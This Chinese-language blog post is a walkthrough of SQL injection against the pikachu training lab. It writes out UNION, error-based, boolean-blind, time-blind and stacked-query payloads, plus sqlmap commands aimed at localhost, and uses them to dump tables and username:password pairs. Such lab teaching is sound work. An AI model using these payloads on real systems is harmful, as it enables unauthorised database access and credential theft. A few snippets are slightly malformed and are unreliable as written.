@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/242532040?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="### SQL注入原理
+SQL注入就是指Web应用程序对用户输入数据的合理性没有进行判断，前端传入后端的参数是攻击者可控制的，并且根据参数带入数据库查询，攻击者可以通过构造不同的SQL语句来对数据库进行任意查询。">
+<meta property="og:title" content="SQL注入攻击及防御pikachu靶场">
+<meta property="og:description" content="### SQL注入原理
+SQL注入就是指Web应用程序对用户输入数据的合理性没有进行判断，前端传入后端的参数是攻击者可控制的，并且根据参数带入数据库查询，攻击者可以通过构造不同的SQL语句来对数据库进行任意查询。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://yixunblog.github.io/post/SQL-zhu-ru-gong-ji-ji-fang-yu-pikachu-ba-chang.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/242532040?v=4">
+<title>SQL注入攻击及防御pikachu靶场</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">SQL注入攻击及防御pikachu靶场</h1>
+<div class="title-right">
+    <a href="https://yixunblog.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/yixunblog/yixunblog.github.io/issues/8" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h3>SQL注入原理</h3>
+<p>SQL注入就是指Web应用程序对用户输入数据的合理性没有进行判断，前端传入后端的参数是攻击者可控制的，并且根据参数带入数据库查询，攻击者可以通过构造不同的SQL语句来对数据库进行任意查询。下面以PHP语句为例作为展示：</p>
+<p>query "select * from users where id=_GET['id']";</p>
+<h3>SQL注入条件</h3>
+<p>用户可以控制数据的输入。</p>
+<p>原本要运行的代码拼接了用户的输入并运行。</p>
+<p><strong>基本知识（Mysql）</strong></p>
+<p><strong>注入点检测</strong></p>
+<p><strong>页面返回正常</strong></p>
+<p>and 1=1--+</p>
+<p>or 1=2--+</p>
+<p><strong>页面返回异常</strong></p>
+<p>and 1=2--+</p>
+<p>or 1=1--+</p>
+<h3>SQL注入技术</h3>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/69a7562444cd6f90269e7649ee9e55f28007a823045edd67a1dd6a0f16836067/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837353331342d32633730373539352d336435382d346162652d386438642d3864376439343462326663662e706e67"><img src="https://camo.githubusercontent.com/69a7562444cd6f90269e7649ee9e55f28007a823045edd67a1dd6a0f16836067/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837353331342d32633730373539352d336435382d346162652d386438642d3864376439343462326663662e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498875314-2c707595-3d58-4abe-8d8d-8d7d944b2fcf.png" style="max-width: 100%;"></a></p>
+<h3>Union注入攻击(联合查询注入)</h3>
+<p>利用union查询来运行想要的sql语句</p>
+<p>字符型注入，目标：获取当前数据库中的所有用户名及其他感兴趣的信息。</p>
+<h4>注入点判断</h4>
+<p>d' and 1=1#</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/92aa6d578091ca148bc0056ae75b03074d55ba5c67017829e1803115a42aadf8/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837353537382d65333433326634322d363138612d343633332d396234322d3564353838333766383863622e706e67"><img src="https://camo.githubusercontent.com/92aa6d578091ca148bc0056ae75b03074d55ba5c67017829e1803115a42aadf8/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837353537382d65333433326634322d363138612d343633332d396234322d3564353838333766383863622e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498875578-e3432f42-618a-4633-9b42-5d58837f88cb.png" style="max-width: 100%;"></a></p>
+<p> 字符型注入点，使用单引号闭合即可</p>
+<h4>字段判断</h4>
+<p>order by 1和2时没有问题</p>
+<p>order by 后面可以加列名，也可以加数字，数字应是小于等于查询结果的列数，所以可以慢慢增加，当出错时，查询结果就是出错时的数字-1。</p>
+<p>d' order by 3#</p>
+<p>没有找到3这一列  #下面的回显我们-1试试</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/19f8ec1f897b80b603e0de76b987b12be2653bc46b71c0f131e44f7d52f67e2c/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837353831332d39643538663731392d316361342d346430612d626131362d6538346164383132656132622e706e67"><img src="https://camo.githubusercontent.com/19f8ec1f897b80b603e0de76b987b12be2653bc46b71c0f131e44f7d52f67e2c/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837353831332d39643538663731392d316361342d346430612d626131362d6538346164383132656132622e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498875813-9d58f719-1ca4-4d0a-ba16-e84ad812ea2b.png" style="max-width: 100%;"></a></p>
+<p>d' order by 2#   没有报错</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/300c7e422ab8c0a6bb300ada178b0052af14d40499226a917ecc7f186d9fa7f2/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837363037372d65333031353164612d303164662d343739312d386663312d6631633738653535353734392e706e67"><img src="https://camo.githubusercontent.com/300c7e422ab8c0a6bb300ada178b0052af14d40499226a917ecc7f186d9fa7f2/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837363037372d65333031353164612d303164662d343739312d386663312d6631633738653535353734392e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498876077-e30151da-01df-4791-8fc1-f1c78e555749.png" style="max-width: 100%;"></a></p>
+<p>字段数为2，有回显，union没有被过滤，使用Union注入</p>
+<p>sql语句猜测，从某个表根据用户名返回两个字段</p>
+<p>select field1,field2 from table where 用户名 = ''</p>
+<h4>查询当前数据库</h4>
+<p>当前的用database()函数即可</p>
+<p>d' union select 1,database() from information_schema.schemata#</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3ad37fb5c6e32e81439d1d0ab358d7505446b44446bde04ca2690c02958fa137/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837363434322d36326466626135372d323430392d343336362d396234652d6264303863313734636566302e706e67"><img src="https://camo.githubusercontent.com/3ad37fb5c6e32e81439d1d0ab358d7505446b44446bde04ca2690c02958fa137/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837363434322d36326466626135372d323430392d343336362d396234652d6264303863313734636566302e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498876442-62dfba57-2409-4366-9b4e-bd08c174cef0.png" style="max-width: 100%;"></a></p>
+<p> 得到数据库名pikachu</p>
+<h4>查询表名</h4>
+<p>d' UNION SELECT 1,table_name from information_schema.tables where table_schema='pikachu'#</p>
+<p>查询到的表</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8d74e35b23ec26cfc0dbd00cf3b489969af6d4e060f57254a02c8d08064100b7/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837363636302d33613038616330352d373431392d346131642d616138612d3163383961323066383734622e706e67"><img src="https://camo.githubusercontent.com/8d74e35b23ec26cfc0dbd00cf3b489969af6d4e060f57254a02c8d08064100b7/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837363636302d33613038616330352d373431392d346131642d616138612d3163383961323066383734622e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498876660-3a08ac05-7419-4a1d-aa8a-1c89a20f874b.png" style="max-width: 100%;"></a></p>
+<p>得到表名httpinfo、member、message、users、xssblind</p>
+<h4>查询列名</h4>
+<p>根据我们的目标，假设对member(成员)感兴趣</p>
+<p>#查询member表中的列名</p>
+<p>d' union select 1,column_name from information_schema.columns where table_schema='pikachu' and table_name='member'#</p>
+<p>#查询httpinfo表中的列名</p>
+<p>d' union select 1,column_name from information_schema.columns where table_schema='pikachu' and table_name='httpinfo'#</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/714e94ab06383cd8014a02fab46c5ef65bf7712e9c3fc33d36e7ab2c42c9e5f0/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837363930392d33646639626164332d656162632d343231312d626461372d3337663061646165646539632e706e67"><img src="https://camo.githubusercontent.com/714e94ab06383cd8014a02fab46c5ef65bf7712e9c3fc33d36e7ab2c42c9e5f0/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837363930392d33646639626164332d656162632d343231312d626461372d3337663061646165646539632e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498876909-3df9bad3-eabc-4211-bda7-37f0adaede9c.png" style="max-width: 100%;"></a></p>
+<h4>查询所需字段值</h4>
+<p>有了username就可以通过他给的表单获取对应email，所以就假设我们对phone、address更感兴趣，0x3a是冒号':'，0x7e是~。</p>
+<p>group_concat()<strong>将多行字符串拼接成一行</strong></p>
+<p>d' union select 1,group_concat(username,0x3a,phonenum,0x3a,address) from member#</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3d65daa88e1acb4b2bab3429b594bf1fc3a5c3140de430e6679c7c69d6876e2f/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837373132352d38366666636139352d383864652d346239362d623834612d6465366565333834616563652e706e67"><img src="https://camo.githubusercontent.com/3d65daa88e1acb4b2bab3429b594bf1fc3a5c3140de430e6679c7c69d6876e2f/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837373132352d38366666636139352d383864652d346239362d623834612d6465366565333834616563652e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498877125-86ffca95-88de-4b96-b84a-de6ee384aece.png" style="max-width: 100%;"></a></p>
+<h4>Error注入攻击报错注入</h4>
+<p>如果union被过滤，可以使用基于错误的注入攻击，一般利用floor，updatexml, extractvalue函数、还有exp和一些几何函数，补充exp：Error Based SQL Injection Using EXP | 🔐Blog of Osanda。利用了"DOUBLE value is out of range"。</p>
+<p>Floor函数报错</p>
+<p>关键函数：</p>
+<p>Rand() -------产生0~1的伪随机数</p>
+<p>Floor() -------向下取整数</p>
+<p>Concat() -----连接字符串</p>
+<p>Count() ------计算总数</p>
+<p>Payload如下：</p>
+<p>Select count(*),concat(PAYLOAD,floor(rand(0)*2))x from 表名 group by x;</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/66e67aa464f34b83ffdb9c8a7bd47ff797a039cebafa4245cbd8d5e3f4bc316a/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837373336362d32646231373734312d396336392d343639372d613532662d3238636363313664326534382e706e67"><img src="https://camo.githubusercontent.com/66e67aa464f34b83ffdb9c8a7bd47ff797a039cebafa4245cbd8d5e3f4bc316a/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837373336362d32646231373734312d396336392d343639372d613532662d3238636363313664326534382e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498877366-2db17741-9c69-4697-a52f-28ccc16d2e48.png" style="max-width: 100%;"></a></p>
+<p>floor和rand(0)产生重复序列</p>
+<p>根据x字段进行分组，统计x的个数</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/cb628fa7754eb1004c554918035b07bdca55f46dcd69d5b5b499e645a16a86df/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837373634382d34393132353732322d393830312d343935382d383665392d3064613736623662353334342e706e67"><img src="https://camo.githubusercontent.com/cb628fa7754eb1004c554918035b07bdca55f46dcd69d5b5b499e645a16a86df/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837373634382d34393132353732322d393830312d343935382d383665392d3064613736623662353334342e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498877648-49125722-9801-4958-86e9-0da76b6b5344.png" style="max-width: 100%;"></a></p>
+<p><strong>字符型注入，目标：获取当前数据库中的users表中的所有用户名及其他感兴趣的信息。</strong></p>
+<p>注入点和字段数判断同上，已知：</p>
+<p>字符型注入点，使用单引号闭合即可</p>
+<p>字段数为2，有回显，updatexml没有被过滤，使用报错注入</p>
+<p><strong>#0x7e代表的是~号</strong></p>
+<p><strong>LIMIT语法</strong></p>
+<p>语法：</p>
+<p>limit m,n</p>
+<p>从m位置开始，取n条记录</p>
+<p><strong>查询表名</strong></p>
+<p>d' and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2270fe80bdbebd422bfd79e861d111cbcd737a72175db5350c3c63d3e89e6270/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837373832372d30653734333937362d323530612d343635622d623931662d3338666361626563613733342e706e67"><img src="https://camo.githubusercontent.com/2270fe80bdbebd422bfd79e861d111cbcd737a72175db5350c3c63d3e89e6270/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837373832372d30653734333937362d323530612d343635622d623931662d3338666361626563613733342e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498877827-0e743976-250a-465b-b91f-38fcabeca734.png" style="max-width: 100%;"></a></p>
+<p>注意，结果只能是一行，所以使用了limit 0,1获得第一个表</p>
+<p>当sql语句是使用 limit 3,1是时候就可以得到了users表。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/dddc3869a55f92efb045e3b1dc7305689f6597fc12d92f18deeda68f1719024a/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837383034372d62666564366230312d383061642d346661392d383934332d3834323265633331643361312e706e67"><img src="https://camo.githubusercontent.com/dddc3869a55f92efb045e3b1dc7305689f6597fc12d92f18deeda68f1719024a/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837383034372d62666564366230312d383061642d346661392d383934332d3834323265633331643361312e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498878047-bfed6b01-80ad-4fa9-8943-8422ec31d3a1.png" style="max-width: 100%;"></a></p>
+<p>** 查询列名**</p>
+<p>d' and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),0x7e),1)#</p>
+<p><strong>#共有一下几列</strong></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fb38ab898c1b205ffcd789e729a1a02102a5876596a4cfbbf005416c6ce849fd/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837383238322d66343966396664642d643139662d343165392d393665612d6264613835333866643935322e706e67"><img src="https://camo.githubusercontent.com/fb38ab898c1b205ffcd789e729a1a02102a5876596a4cfbbf005416c6ce849fd/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837383238322d66343966396664642d643139662d343165392d393665612d6264613835333866643935322e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498878282-f49f9fdd-d19f-41e9-96ea-bda8538fd952.png" style="max-width: 100%;"></a></p>
+<p><strong>查询到的列名</strong></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a66f9e1461a547dcef326619a062721d835fff61b384cff6d2a1b4f2456594e4/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837383438392d35323961616334342d653134632d346362642d386135312d3666326266366239383965312e706e67"><img src="https://camo.githubusercontent.com/a66f9e1461a547dcef326619a062721d835fff61b384cff6d2a1b4f2456594e4/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837383438392d35323961616334342d653134632d346362642d386135312d3666326266366239383965312e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498878489-529aac44-e14c-4cbd-8a51-6f2bf6b989e1.png" style="max-width: 100%;"></a></p>
+<p>同样，当sql语句是使用 limit 1,1、limit 2,1、limit 3,1时，就得到了username、password、level三个列名。</p>
+<h4>查询所需字段值</h4>
+<p>假设我们对username和password感兴趣</p>
+<p>d' and updatexml(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) from users limit 0,1),0x7e),1)#</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/263488eb77df309cd5d9eb5c85adc7703c6adc2549333a8fed2a3ae07dee1167/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837383738382d31636564633338312d623138342d346132312d616361652d3066386130393061366339302e706e67"><img src="https://camo.githubusercontent.com/263488eb77df309cd5d9eb5c85adc7703c6adc2549333a8fed2a3ae07dee1167/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837383738382d31636564633338312d623138342d346132312d616361652d3066386130393061366339302e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498878788-1cedc381-b184-4a21-acae-0f8a090a6c90.png" style="max-width: 100%;"></a></p>
+<p><strong>可以看出报错注入攻击比较麻烦，如果有回显，union没有被过滤，还是优先使用union注入攻击。</strong></p>
+<p>----------------------------------------没有回显-----------------------------------------------</p>
+<p><strong>接下来就是难度中等的了，没有回显，采用盲注</strong></p>
+<p>**B**<strong>oolean注入攻击(没有回显)</strong></p>
+<p>基于布尔判断的攻击</p>
+<p>根据前面知道有个用户名是vince。</p>
+<p>vince' and length(database())=7#</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3f474eca971b47af90b231cf2d985aa0d7d604a7fc96071cacd243b62277be7e/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837383936342d36303032333338652d323039362d346332662d393734342d6364663138333537353338362e706e67"><img src="https://camo.githubusercontent.com/3f474eca971b47af90b231cf2d985aa0d7d604a7fc96071cacd243b62277be7e/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837383936342d36303032333338652d323039362d346332662d393734342d6364663138333537353338362e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498878964-6002338e-2096-4c2f-9744-cdf183575386.png" style="max-width: 100%;"></a></p>
+<p>没有错误</p>
+<p>此时，条件语句where username='vince' and length(database())=7是True，也就是说数据库长度为7。</p>
+<p>substr()截取字符串的一部分</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/09e0933fbb3202e5530ffa8ea3fe7b2ed62c2def50c1d49c8a693e4e0312b82f/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837393332362d33346436376565362d326339322d343731342d616632382d3334633038393238386239352e706e67"><img src="https://camo.githubusercontent.com/09e0933fbb3202e5530ffa8ea3fe7b2ed62c2def50c1d49c8a693e4e0312b82f/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837393332362d33346436376565362d326339322d343731342d616632382d3334633038393238386239352e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498879326-34d67ee6-2c92-4714-af28-34c089288b95.png" style="max-width: 100%;"></a></p>
+<p>字符</p>
+<p>vince' and ascii(substr(database(),1,1))=112#</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e6d0acd71e9279a987b37d634b51a9c4e78f99cc3f48643277bd2da3160634eb/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837393933312d38646363653836372d653335372d343765362d626635642d3331373835363064663766612e706e67"><img src="https://camo.githubusercontent.com/e6d0acd71e9279a987b37d634b51a9c4e78f99cc3f48643277bd2da3160634eb/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383837393933312d38646363653836372d653335372d343765362d626635642d3331373835363064663766612e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498879931-8dcce867-e357-47e6-bf5d-3178560df7fa.png" style="max-width: 100%;"></a></p>
+<p><strong>ascii</strong></p>
+<p>vince' and ascii(substr(database(),2,1))=105#</p>
+<p>上面是数据库名第二字符'i'的，数据库名出来后再将database()改为select语句去找表名等，一般是写脚本，一个个的手工判断时间太长，有时间写了脚本再来更新，或者使用sqlmap。</p>
+<p>python sqlmap.py -u "<a href="http://localhost/pikachu/vul/sqli/sqli_blind_b.php?name=d&amp;submit=" rel="nofollow">http://localhost/pikachu/vul/sqli/sqli_blind_b.php?name=d&amp;submit=</a>查询" --technique=B -dbms mysql --threads 5 -v 3 -dbs --batch</p>
+<p>使用的是MID函数，和substr一样。在网络安全-Mysql注入知识点中有这个函数的用法。</p>
+<p>**T**<strong>ime注入攻击时间盲注（无回显）</strong></p>
+<p>基于时间的攻击，利用if、sleep、benchmark、get_lock等函数，使用rpad或repeat构造长字符串，加RLIKE，利用多个大表的笛卡尔积。</p>
+<p>GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s[[)，这种绕过方法是存在限制条件的，即<strong>数据库的连接必须是持久连接</strong></p>
+<p>vince' and if(length(database()=7),sleep(3),1)#</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f7de18ae911db04ed5d17ef3d806936b10c8588d9cadbfe0175fbef193ed094f/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838303138322d65363830663830642d663161362d343162642d393438362d3136326166323634306164382e706e67"><img src="https://camo.githubusercontent.com/f7de18ae911db04ed5d17ef3d806936b10c8588d9cadbfe0175fbef193ed094f/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838303138322d65363830663830642d663161362d343162642d393438362d3136326166323634306164382e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498880182-e680f80d-f1a6-41bd-9486-162af2640ad8.png" style="max-width: 100%;"></a></p>
+<p>同样，也是写脚本，通过返回的时间长短判断，可使用sqlmap。</p>
+<p>python sqlmap.py -u "<a href="http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=d&amp;submit=%E6%9F%A5%E8%AF%A2" rel="nofollow">http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=d&amp;submit=%E6%9F%A5%E8%AF%A2</a>" --technique=T --time-sec 2 -dbms mysql --threads 5 -v 3 -dbs --batch</p>
+<p>太慢了，有其他办法不建议使用这个。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2e5fc7ff4d7c875890d3425f6dc4c69888ce86881dba5cb4af84a3a75946f654/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838303439302d30616631386333392d333363362d343535642d393838392d3763313364333163356137652e706e67"><img src="https://camo.githubusercontent.com/2e5fc7ff4d7c875890d3425f6dc4c69888ce86881dba5cb4af84a3a75946f654/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838303439302d30616631386333392d333363362d343535642d393838392d3763313364333163356137652e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498880490-0af18c39-33c6-455d-9889-7c13d31c5a7e.png" style="max-width: 100%;"></a></p>
+<p>**堆叠查询注入****S**<strong>tack注入攻击</strong></p>
+<p>需要后台代码是可以执行多条sql语句的，php中是使用PDO方式执行多条语句。</p>
+<p>堆叠注入攻击可以执行多条语句，多语句之间以**分号**隔开。利用这个特点可以在后面的语句中构造自己要执行的语句。</p>
+<p>获取数据库、表（单引号闭合）</p>
+<p>';show databases;show tables;%23</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/0f0592ffc0e6384a5d14e3b3d7aaf31bdf0f209bab1cde79a4885098dca39bc3/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838303739312d64373636386231652d626534342d343166642d393132342d6263653064663266643433632e706e67"><img src="https://camo.githubusercontent.com/0f0592ffc0e6384a5d14e3b3d7aaf31bdf0f209bab1cde79a4885098dca39bc3/68747470733a2f2f63646e2e6e6c61726b2e636f6d2f79757175652f302f323032352f706e672f33393232333732302f313736323439383838303739312d64373636386231652d626534342d343166642d393132342d6263653064663266643433632e706e67" alt="" data-canonical-src="https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498880791-d7668b1e-be44-41fd-9124-bce0df2fd43c.png" style="max-width: 100%;"></a></p>
+<p>可以看到sqlmap中注入技术选择S时，payload中是含分号的。</p>
+<p><strong>--------------------------------------接下来是比较特殊/高级的sql绕过注入--------------------------------</strong></p>
+<p>**inline ****Q**<strong>uery绕过注入攻击</strong></p>
+<h3>内联查询注入攻击</h3>
+<h4>宽字节绕过注入</h4>
+<p>宽字节是在一些特定的编码，如GBK中才有的，编码将两个字节认为是一个汉字（前一个字符ascii码要大于128，才到汉字的范围）。addslashes函数为了防止sql注入，将传入参数值进行转义，将' 转义为'，单引号失去作用。因此，我们需要将\给绕过，这样才可以加'号。</p>
+<p><a href="https://www.atool99.com/urlencode.php" rel="nofollow">在线UrlEncode编码 / UrlDecode解码（gbk, big5, utf8） - aTool在线工具 (atool99.com)</a></p>
